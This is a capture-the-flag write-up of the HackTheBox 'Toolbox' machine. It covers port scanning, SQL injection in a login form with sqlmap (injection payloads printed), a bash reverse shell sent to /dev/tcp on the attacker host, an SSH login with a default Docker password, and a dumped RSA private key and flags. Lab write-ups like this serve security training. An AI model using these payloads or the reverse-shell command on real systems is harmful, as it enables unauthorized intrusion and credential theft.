---
layout: post
title: Hackthebox Toolbox Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2021-04-25/toolbox.png)

# Explanation
[Hackthebox](https://www.hackthebox.eu/) is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Toolbox`.

# Solution
## 1. Initial Enumeration
#### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.236 -sV -sC
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 14:23 JST
Nmap scan report for 10.10.10.236
Host is up (0.30s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MegaLogistics
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 12m52s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-04-25T05:50:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 848.09 seconds
```

#### Gobuster Port 443:
```
root@kali:~# gobuster dir -u https://10.10.10.236 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.236
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/04/25 14:41:09 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/server-status (Status: 403)
===============================================================
2021/04/25 16:16:46 Finished
===============================================================
```

#### FTP Enumeration:
```
root@kali:~# ftp 10.10.10.236
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:inar1): anonymous
331 Password required for anonymous
Password:
230 Logged on
Remote system type is UNIX.
ftp> ls
200 Port command successful
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"
ftp> quit
221 Goodbye
```

### SMB Enumeration:
```
root@kali:~# smbclient -N -L //10.10.10.236
session setup failed: NT_STATUS_ACCESS_DENIED
```

## 2. Getting User

According to the SSL certificate, this server hosts `admin.megalogistic.com` for a virtualhost.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2021-04-25/toolbox.png)

Add this entry to the `/etc/hosts` and access using web browser.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2021-04-25/toolbox.png)
```
root@kali:~# cat /etc/hosts | grep admin
10.10.10.236 admin.megalogistic.com
```


This page contains a login form, check if this login form has SQL injection.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2021-04-25/toolbox.png)
```
root@kali:~# cat sqlmap.txt 
POST / HTTP/1.1
Host: admin.megalogistic.com
Connection: close
Content-Length: 27
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://admin.megalogistic.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://admin.megalogistic.com/
Accept-Encoding: gzip, deflate
Accept-Language: ja,ja-JP;q=0.9,en;q=0.8
Cookie: PHPSESSID=3fd8d348d81c7d2683bbad164dc0f3ab

username=test&password=test
```

We can use SQLmap for this purpose.
```
root@kali:~# sqlmap -r sqlmap.txt --force-ssl
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.11#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:42:16 /2021-04-29/

[15:42:16] [INFO] parsing HTTP request from 'sqlmap.txt'
[15:42:16] [INFO] testing connection to the target URL
[15:42:17] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:42:18] [INFO] testing if the target URL content is stable
[15:42:19] [INFO] target URL content is stable
[15:42:19] [INFO] testing if POST parameter 'username' is dynamic
[15:42:20] [WARNING] POST parameter 'username' does not appear to be dynamic
[15:42:21] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'PostgreSQL')
[15:42:23] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
[15:42:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:42:44] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:42:46] [INFO] testing 'Generic inline queries'
[15:42:47] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[15:42:52] [INFO] POST parameter 'username' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable (with --not-string="11")
[15:42:52] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[15:42:53] [INFO] POST parameter 'username' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
[15:42:53] [INFO] testing 'PostgreSQL inline queries'
[15:42:54] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[15:42:54] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                 
got a 302 redirect to 'https://admin.megalogistic.com:443/dashboard.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] y
[15:43:51] [INFO] POST parameter 'username' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
[15:43:51] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[15:44:04] [INFO] POST parameter 'username' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
[15:44:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[15:44:35] [WARNING] POST parameter 'password' does not appear to be dynamic
[15:44:36] [INFO] heuristic (basic) test shows that POST parameter 'password' might be injectable (possible DBMS: 'PostgreSQL')
[15:44:37] [INFO] testing for SQL injection on POST parameter 'password'
[15:44:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:44:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:44:50] [INFO] testing 'Generic inline queries'
[15:44:51] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[15:44:54] [INFO] POST parameter 'password' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
[15:44:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[15:44:55] [INFO] POST parameter 'password' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
[15:44:55] [INFO] testing 'PostgreSQL inline queries'
[15:44:56] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[15:45:10] [INFO] POST parameter 'password' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
[15:45:10] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[15:45:23] [INFO] POST parameter 'password' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
[15:45:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: username=test' AND (SELECT (CASE WHEN (4255=4255) THEN NULL ELSE CAST((CHR(81)||CHR(83)||CHR(106)||CHR(79)) AS NUMERIC) END)) IS NULL-- qXuq&password=test

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=test' AND 6451=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (6451=6451) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113)) AS NUMERIC)-- ZQoE&password=test

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=test';SELECT PG_SLEEP(5)--&password=test

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=test' AND 2075=(SELECT 2075 FROM PG_SLEEP(5))-- Jmmv&password=test

Parameter: password (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: username=test&password=test') AND (SELECT (CASE WHEN (1055=1055) THEN NULL ELSE CAST((CHR(84)||CHR(101)||CHR(101)||CHR(104)) AS NUMERIC) END)) IS NULL-- Gnvh

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=test&password=test') AND 7848=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (7848=7848) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113)) AS NUMERIC)-- cPkC

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=test&password=test');SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=test&password=test') AND 1750=(SELECT 1750 FROM PG_SLEEP(5))-- UTFh
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: username, type: Single quoted string (default)
[1] place: POST, parameter: password, type: Single quoted string
[q] Quit
> q
[15:46:36] [ERROR] user quit

[*] ending @ 15:46:36 /2021-04-29/

root@kali:~# 
```

Using `--os--shell` option, we can gain a shell session.<br>
```
root@kali:~# sqlmap -r sqlmap.txt --force-ssl --os-shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:49:31 /2021-04-29/

[15:49:31] [INFO] parsing HTTP request from 'sqlmap.txt'
[15:49:32] [INFO] resuming back-end DBMS 'postgresql' 
[15:49:32] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: username=test&password=test') AND (SELECT (CASE WHEN (1055=1055) THEN NULL ELSE CAST((CHR(84)||CHR(101)||CHR(101)||CHR(104)) AS NUMERIC) END)) IS NULL-- Gnvh

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=test&password=test') AND 7848=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (7848=7848) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113)) AS NUMERIC)-- cPkC

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=test&password=test');SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=test&password=test') AND 1750=(SELECT 1750 FROM PG_SLEEP(5))-- UTFh

Parameter: username (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: username=test' AND (SELECT (CASE WHEN (4255=4255) THEN NULL ELSE CAST((CHR(81)||CHR(83)||CHR(106)||CHR(79)) AS NUMERIC) END)) IS NULL-- qXuq&password=test

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=test' AND 6451=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (6451=6451) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(112)||CHR(122)||CHR(113)) AS NUMERIC)-- ZQoE&password=test

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=test';SELECT PG_SLEEP(5)--&password=test

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=test' AND 2075=(SELECT 2075 FROM PG_SLEEP(5))-- Jmmv&password=test
---
there were multiple injection points, please select the one to use for following injections:
[0] place: POST, parameter: username, type: Single quoted string (default)
[1] place: POST, parameter: password, type: Single quoted string
[q] Quit
> 0
[15:49:35] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[15:49:35] [INFO] fingerprinting the back-end DBMS operating system
[15:49:39] [INFO] the back-end DBMS operating system is Linux
[15:49:41] [INFO] testing if current user is DBA
[15:49:44] [INFO] retrieved: '1'
[15:49:45] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[15:49:45] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] n
[15:49:52] [INFO] retrieved: 'uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)'
os-shell> 
```

To get a reverse shell, we can execute the following command.
```
root@kali:~# nc -nlvp 4443
Listening on 0.0.0.0 4443

```
```
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.42/4443 0>&1'
do you want to retrieve the command standard output? [Y/n/a] n

```
```
root@kali:~# nc -nlvp 4443
Listening on 0.0.0.0 4443
Connection received on 10.10.10.236 49906
bash: cannot set terminal process group (2736): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ id
id
uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ 
```

`user.txt` is in the directory `hogehoge`.
```
postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt
cat user.txt
f0183e44378ea9774433e2ca6ac78c6a  flag.txt
```

## 3. Getting Root

```
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ cat /etc/os-release
cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

```
postgres@bc56e3cc55e9:/var/lib/postgresql$ ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 3601  bytes 606518 (592.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2573  bytes 3664168 (3.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8239  bytes 3003425 (2.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8239  bytes 3003425 (2.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

```
postgres@bc56e3cc55e9:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
postgres@bc56e3cc55e9:/$ ssh docker@172.17.0.1
ssh docker@172.17.0.1
docker@172.17.0.1's password: tcuser

   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$ 
```

```
docker@box:/c/Users/Administrator/.ssh$ cat id_rsa                             
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
aJ1GunZCyic0iSwemcBJiNyfZChTipWmBMK88wIDAQABAoIBAH7PEuBOj+UHrM+G
Stxb24LYrUa9nBPnaDvJD4LBishLzelhGNspLFP2EjTJiXTu5b/1E82qK8IPhVlC
JApdhvDsktA9eWdp2NnFXHbiCg0IFWb/MFdJd/ccd/9Qqq4aos+pWH+BSFcOvUlD
vg+BmH7RK7V1NVFk2eyCuS4YajTW+VEwD3uBAl5ErXuKa2VP6HMKPDLPvOGgBf9c
l0l2v75cGjiK02xVu3aFyKf3d7t/GJBgu4zekPKVsiuSA+22ZVcTi653Tum1WUqG
MjuYDIaKmIt9QTn81H5jAQG6CMLlB1LZGoOJuuLhtZ4qW9fU36HpuAzUbG0E/Fq9
jLgX0aECgYEA4if4borc0Y6xFJxuPbwGZeovUExwYzlDvNDF4/Vbqnb/Zm7rTW/m
YPYgEx/p15rBh0pmxkUUybyVjkqHQFKRgu5FSb9IVGKtzNCtfyxDgsOm8DBUvFvo
qgieIC1S7sj78CYw1stPNWS9lclTbbMyqQVjLUvOAULm03ew3KtkURECgYEA17Nr
Ejcb6JWBnoGyL/yEG44h3fHAUOHpVjEeNkXiBIdQEKcroW9WZY9YlKVU/pIPhJ+S
7s++kIu014H+E2SV3qgHknqwNIzTWXbmqnclI/DSqWs19BJlD0/YUcFnpkFG08Xu
iWNSUKGb0R7zhUTZ136+Pn9TEGUXQMmBCEOJLcMCgYBj9bTJ71iwyzgb2xSi9sOB
MmRdQpv+T2ZQQ5rkKiOtEdHLTcV1Qbt7Ke59ZYKvSHi3urv4cLpCfLdB4FEtrhEg
5P39Ha3zlnYpbCbzafYhCydzTHl3k8wfs5VotX/NiUpKGCdIGS7Wc8OUPBtDBoyi
xn3SnIneZtqtp16l+p9pcQKBgAg1Xbe9vSQmvF4J1XwaAfUCfatyjb0GO9j52Yp7
MlS1yYg4tGJaWFFZGSfe+tMNP+XuJKtN4JSjnGgvHDoks8dbYZ5jaN03Frvq2HBY
RGOPwJSN7emx4YKpqTPDRmx/Q3C/sYos628CF2nn4aCKtDeNLTQ3qDORhUcD5BMq
bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
-----END RSA PRIVATE KEY-----
```

```
docker@box:/c/Users/Administrator/.ssh$ sudo -l                                
sudo -l
User docker may run the following commands on this host:
    (root) NOPASSWD: ALL

```

```
docker@box:/c/Users/Administrator/desktop$ cat root.txt                        
cat root.txt
cc9a0b76ac17f8f475250738b96261b3 
```
